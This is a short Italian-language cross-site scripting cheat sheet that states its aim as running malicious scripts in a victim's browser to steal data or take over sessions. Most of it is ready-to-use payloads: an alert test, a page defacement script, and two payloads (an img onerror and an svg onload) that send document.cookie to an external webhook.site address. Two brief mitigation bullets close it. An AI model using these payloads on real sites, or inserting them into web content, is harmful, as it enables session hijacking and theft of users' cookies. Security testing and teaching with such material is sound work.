# XSS (Cross-Site Scripting)

### **Obiettivo**
Eseguire script dannosi nel browser della vittima per rubare dati sensibili o prendere il controllo della sessione.

### **Payload Riflessi**

- **Script semplice:**

    ```html
  <script>alert(1)</script>
    ```

- **Ruba i cookie:**

    ```html
  <img src="x" onerror="fetch('https://webhook.site/42c40dc4-22d0-46a1-a364-2732cc60eb32?cookie='+document.cookie)">
    ```

- **Bypass dei filtri con SVG:**

    ```html
  <svg onload="fetch('https://webhook.site/42c40dc4-22d0-46a1-a364-2732cc60eb32?cookie='+document.cookie)"></svg>
    ```

### **Payload Persistenti**

- **Aggiungere uno script:**

    ```html
  <script>document.body.innerHTML='<h1>Hacked</h1>'</script>
    ```

### **Mitigazione**
- Escapa l'input dell'utente prima di mostrarlo nel DOM.
- Usa Content Security Policy (CSP).
